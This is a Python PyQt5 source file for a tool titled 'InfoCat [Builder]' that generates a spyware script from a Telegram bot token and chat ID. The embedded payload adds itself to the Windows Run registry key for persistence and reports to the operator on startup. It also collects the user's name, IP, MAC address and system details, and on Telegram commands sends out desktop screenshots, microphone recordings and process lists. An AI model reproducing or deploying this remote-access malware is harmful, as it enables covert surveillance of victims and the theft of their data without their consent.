# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'untitled.ui'
#
# Created by: PyQt5 UI code generator 5.15.6
#
# WARNING: Any manual changes made to this file will be lost when pyuic5 is
# run again.  Do not edit this file unless you know what you are doing.


from PyQt5 import QtCore, QtGui, QtWidgets
from PyQt5.QtWidgets import QMessageBox
import os

logo = "infLogo.png"
path = os.path.dirname(os.path.realpath(__file__))
address = os.path.join(path, logo)


class Ui_MainWindow(object):
    def clicked(self):
        system = open(f"{self.lineEdit_filename.text()}.py", "w", encoding='utf-8')
        system.write('''# -*- coding: utf-8 -*- 
import asyncio
from aiogram import Bot, Dispatcher, types, executor
import getpass
import os
import platform
import socket
import sys
from datetime import datetime, timezone
from uuid import getnode as get_mac
import psutil
import pyautogui
from speedtest import Speedtest
import pyaudio
import wave
from PIL import Image
from subprocess import Popen, PIPE
from winreg import OpenKey, SetValueEx, CloseKey, HKEY_CURRENT_USER, KEY_ALL_ACCESS, REG_SZ

bot = Bot(token="''' + self.lineEdit_api.text() + '''")
dp = Dispatcher(bot)

autoname = "''' + self.lineEdit_filename.text() + '''.py"
path = os.path.dirname(os.path.realpath(__file__))
address = os.path.join(path, autoname)
key_reg = OpenKey(HKEY_CURRENT_USER,
                  r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
                  0, KEY_ALL_ACCESS)
SetValueEx(key_reg, autoname, 0, REG_SZ, address)
CloseKey(key_reg)

start = datetime.now()
name = getpass.getuser()
ip = socket.gethostbyname(socket.gethostname())
mac = get_mac()
ost = platform.uname()
inet = Speedtest()
download = float(str(inet.download())[0:2] + "."
                 + str(round(inet.download(), 2))[1]) * 0.125
uploads = float(str(inet.upload())[0:2] + "."
                + str(round(inet.download(), 2))[1]) * 0.125
zone = psutil.boot_time()
time = datetime.fromtimestamp(zone)
cpu = psutil.cpu_freq()
ends = datetime.now()
workspeed = format(ends - start)


async def main():
    await dp.bot.send_message(''' + self.lineEdit_id.text() + ''', "âœ“ System started!")


try:
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
except DeprecationWarning:
    pass


@dp.message_handler(commands="check")
async def cmd_check(message: types.Message):
    await message.answer("System status: online")


async def cmd_help(message: types.Message):
    await message.answer(f'\\nCommand List:\\n/check - Checking System Status\\n/info - System characteristics\\n/screen - Desktop screenshot\\n/audio - Record audio from a voice recorder for a minute\\n/process - List of running processes\\n/exit - Shutting down the program before reboot\\n')


async def cmd_info(message: types.Message):
    file = open("info.txt", "w")
    file.write(f"[================================================]\\n  Operating System: {ost.system}\\n  Processor: {ost.processor}\\n  Username: {name}\\n  IP adress: {ip}\\n  MAC adress: {mac}\\n  Timezone: {time.year}/{time.month}/{time.day} {time.hour}:{time.minute}:{time.second}\\n  Work speed: {workspeed}\\n  Download: {download} MB/s\\n  Upload: {uploads} MB/s\\n  Max Frequency: {cpu.max:.2f} Mhz\\n  Min Frequency: {cpu.min:.2f} Mhz\\n  Current Frequency: {cpu.current:.2f} Mhz\\n[================================================]\\n")
    file.close()
    await message.answer_document(open("info.txt", "rb"))
    file.close()
    os.remove("info.txt")


async def cmd_screen(message: types.Message):
    screen = pyautogui.screenshot("screenshot.jpg")
    await message.answer_photo(open("screenshot.jpg", "rb"))
    os.remove("screenshot.jpg")


async def cmd_audio(message: types.Message):
    chunk = 1024
    formats = pyaudio.paInt16
    channels = 2
    rate = 44100
    second = ''' + self.lineEdit_seconds.text() + '''
    names = "sound.wav"
    p = pyaudio.PyAudio()
    stream = p.open(format=formats,
                    channels=channels,
                    rate=rate,
                    input=True,
                    frames_per_buffer=chunk)
    print("")

    frames = []

    for i in range(0, int(rate / chunk * second)):
        data = stream.read(chunk)
        frames.append(data)

    print("")

    stream.stop_stream()
    stream.close()
    p.terminate()

    wf = wave.open(names, "wb")
    wf.setnchannels(channels)
    wf.setsampwidth(p.get_sample_size(formats))
    wf.setframerate(rate)
    wf.writeframes(b''.join(frames))
    await message.answer_audio(open("sound.wav", "rb"))
    wf.close()
    os.remove(names)


async def cmd_process(message: types.Message):
    process = [line.decode("cp866", "ignore") for line in Popen("tasklist", stdout=PIPE).stdout.readlines()]
    ride = open("process.txt", "w", encoding="utf-8")
    ride.write(' '.join(process))
    ride.close()
    await message.answer_document(open("process.txt", "rb"))
    ride.close()
    os.remove("process.txt")


async def cmd_exit(message: types.Message):
    await message.answer("Goodbye!")
    raise SystemExit

dp.register_message_handler(cmd_info, commands="info")
dp.register_message_handler(cmd_screen, commands="screen")
dp.register_message_handler(cmd_audio, commands="audio")
dp.register_message_handler(cmd_process, commands="process")
dp.register_message_handler(cmd_help, commands="help")
dp.register_message_handler(cmd_exit, commands="exit")
executor.start_polling(dp, skip_updates=True)

''')
        inf = QMessageBox()
        inf.setWindowTitle("INFO")
        inf.setText(f"The {self.lineEdit_filename.text()}.py file is ready!")
        inf.setIcon(QMessageBox.Information)
        inf.setStandardButtons(QMessageBox.Ok)
        inf.exec_()

    def setupUi(self, MainWindow):
        MainWindow.setObjectName("MainWindow")
        MainWindow.resize(500, 600)
        MainWindow.setStyleSheet("background-color: rgb(35, 35, 35);")
        icon = QtGui.QIcon()
        icon.addPixmap(QtGui.QPixmap("icon.ico"),
                       QtGui.QIcon.Selected, QtGui.QIcon.On)
        MainWindow.setWindowIcon(icon)
        self.centralwidget = QtWidgets.QWidget(MainWindow)
        self.centralwidget.setObjectName("centralwidget")
        self.label_api = QtWidgets.QLabel(self.centralwidget)
        self.label_api.setGeometry(QtCore.QRect(110, 210, 101, 61))
        font = QtGui.QFont()
        font.setFamily("Anson")
        font.setPointSize(12)
        font.setBold(False)
        font.setWeight(50)
        self.label_api.setFont(font)
        self.label_api.setLayoutDirection(QtCore.Qt.LeftToRight)
        self.label_api.setStyleSheet("color: rgb(255, 255, 255);")
        self.label_api.setObjectName("label_api")
        self.label_id = QtWidgets.QLabel(self.centralwidget)
        self.label_id.setGeometry(QtCore.QRect(110, 330, 101, 61))
        font = QtGui.QFont()
        font.setFamily("Anson")
        font.setPointSize(12)
        font.setBold(False)
        font.setWeight(50)
        self.label_id.setFont(font)
        self.label_id.setLayoutDirection(QtCore.Qt.LeftToRight)
        self.label_id.setStyleSheet("color: rgb(255, 255, 255);")
        self.label_id.setObjectName("label_id")
        self.label_filename = QtWidgets.QLabel(self.centralwidget)
        self.label_filename.setGeometry(QtCore.QRect(110, 250, 101, 61))
        font = QtGui.QFont()
        font.setFamily("Anson")
        font.setPointSize(12)
        font.setBold(False)
        font.setWeight(50)
        self.label_filename.setFont(font)
        self.label_filename.setLayoutDirection(QtCore.Qt.LeftToRight)
        self.label_filename.setStyleSheet("color: rgb(255, 255, 255);")
        self.label_filename.setObjectName("label_filename")
        self.label_seconds = QtWidgets.QLabel(self.centralwidget)
        self.label_seconds.setGeometry(QtCore.QRect(110, 290, 101, 61))
        font = QtGui.QFont()
        font.setFamily("Anson")
        font.setPointSize(12)
        font.setBold(False)
        font.setWeight(50)
        self.label_seconds.setFont(font)
        self.label_seconds.setLayoutDirection(QtCore.Qt.LeftToRight)
        self.label_seconds.setStyleSheet("color: rgb(255, 255, 255);")
        self.label_seconds.setObjectName("label_seconds")
        self.lineEdit_api = QtWidgets.QLineEdit(self.centralwidget)
        self.lineEdit_api.setGeometry(QtCore.QRect(210, 230, 181, 22))
        self.lineEdit_api.setStyleSheet("background-color: rgb(213, 213, 213);")
        self.lineEdit_api.setObjectName("lineEdit_api")
        self.lineEdit_filename = QtWidgets.QLineEdit(self.centralwidget)
        self.lineEdit_filename.setGeometry(QtCore.QRect(210, 270, 181, 22))
        self.lineEdit_filename.setStyleSheet("background-color: rgb(213, 213, 213);")
        self.lineEdit_filename.setObjectName("lineEdit_filename")
        self.lineEdit_seconds = QtWidgets.QLineEdit(self.centralwidget)
        self.lineEdit_seconds.setGeometry(QtCore.QRect(210, 310, 181, 22))
        self.lineEdit_seconds.setStyleSheet("background-color: rgb(213, 213, 213);")
        self.lineEdit_seconds.setObjectName("lineEdit_seconds")
        self.lineEdit_id = QtWidgets.QLineEdit(self.centralwidget)
        self.lineEdit_id.setGeometry(QtCore.QRect(210, 350, 181, 22))
        self.lineEdit_id.setStyleSheet("background-color: rgb(213, 213, 213);")
        self.lineEdit_id.setObjectName("lineEdit_id")
        self.Build = QtWidgets.QPushButton(self.centralwidget)
        self.Build.setGeometry(QtCore.QRect(180, 420, 141, 61))
        self.Build.clicked.connect(self.clicked)
        font = QtGui.QFont()
        font.setFamily("ReSquare")
        font.setPointSize(10)
        font.setBold(True)
        font.setWeight(75)
        self.Build.setFont(font)
        self.Build.setStyleSheet("background-color: rgb(255, 255, 0);")
        self.Build.setObjectName("Build")
        self.label = QtWidgets.QLabel(self.centralwidget)
        self.label.setGeometry(QtCore.QRect(0, 0, 501, 221))
        self.label.setText("")
        self.label.setPixmap(QtGui.QPixmap(address))
        self.label.setObjectName("label")
        MainWindow.setCentralWidget(self.centralwidget)

        self.retranslateUi(MainWindow)
        QtCore.QMetaObject.connectSlotsByName(MainWindow)

    def retranslateUi(self, MainWindow):
        _translate = QtCore.QCoreApplication.translate
        MainWindow.setWindowTitle(_translate("MainWindow", "InfoCat [Builder]"))
        self.label_api.setText(_translate("MainWindow", "API TOCKEN"))
        self.label_id.setText(_translate("MainWindow", "ID CHAT"))
        self.label_filename.setText(_translate("MainWindow", "FILE NAME"))
        self.label_seconds.setText(_translate("MainWindow", "SECONDS"))
        self.Build.setText(_translate("MainWindow", "BUILD"))


if __name__ == "__main__":
    import sys

    app = QtWidgets.QApplication(sys.argv)
    MainWindow = QtWidgets.QMainWindow()
    ui = Ui_MainWindow()
    ui.setupUi(MainWindow)
    MainWindow.show()
    sys.exit(app.exec_())
